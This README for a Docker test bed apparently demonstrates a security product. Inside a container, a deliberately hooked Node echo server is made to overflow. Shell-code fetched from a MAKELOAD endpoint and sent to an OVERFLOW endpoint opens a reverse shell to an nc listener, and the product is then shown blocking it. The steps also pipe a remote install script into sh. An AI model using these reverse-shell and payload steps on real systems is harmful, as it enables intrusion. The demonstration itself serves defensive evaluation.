# readhook-node-echo-server
Test bed for using readhook to hook node-echo-server application.
## Running
```sh
docker run -d --rm --name echo -p 8080:8080 polyverse/readhook-node-echo-server
```
## Stopping
```sh
docker kill echo
```
## Running interactively
```sh
docker run -it --rm --name echo -p 8080:8080 polyverse/readhook-node-echo-server /bin/sh
node echo-server.js
```
## Polyverse Polymorphic Linux
### 1: Setup Listener for Reverse Shell
#### 1.1: Shell-1: Start a listener for the remote shell to connect to
```sh
nc -kl 5555
```
### 2: Start Server with Readhook
#### 2.1: Shell-2: Start the container with an interactive shell
```sh
docker run -it --rm --name echo -p 8080:8080 polyverse/readhook-node-echo-server /bin/sh
```
#### 2.2: Shell-2: Run the echo-server with readhook in front of libc
```sh
LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node /src/echo-server.js
```
#### 2.3: Shell-3: Test that the echo-server is running as expected
```sh
curl localhost:8080/echo-this-line-of-text
```
### 3: Generate Shell-Code
#### 3.1: Shell-3: Generate the shell-code needed to "phone-home" to the listener on Shell-1
```sh
export shellCode=$(curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555)
```
#### 3.2: Shell-3: Send the shell-code to the OVERFLOW endpoint to check that it works.
```sh
curl localhost:8080/$shellCode
```
#### 3.3: Shell-1: Check that the overflow resulted in a remote shell
```sh
ls && whoami && exit
```
### 4: Install Polyverse Polymorphic Linux
#### 4.1: Shell-2: Add curl and Polyverse Distros
```sh
curl https://repo.polyverse.io/install.sh | sh -s vZ2v3Bo4Kbnwj9pECrLsoGDDo
```
#### 4.2: Shell-2: Update packages with Polymorphic Linux packages
```sh
sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
```
#### 4.3: Shell-2: Re-run the echo-server with basehook.so (only)
```sh
LD_PRELOAD=/tmp/basehook.so node /src/echo-server.js
```
#### 4.4: Shell-3: Test the shellCode with Polymorphic Linux
```sh
curl localhost:8080/$shellCode
```
#### 4.5: Shell 1: Confirm that nobody phoned-home to the listener
#### 4.6: Shell 2: Confirm that node terminated abnormally
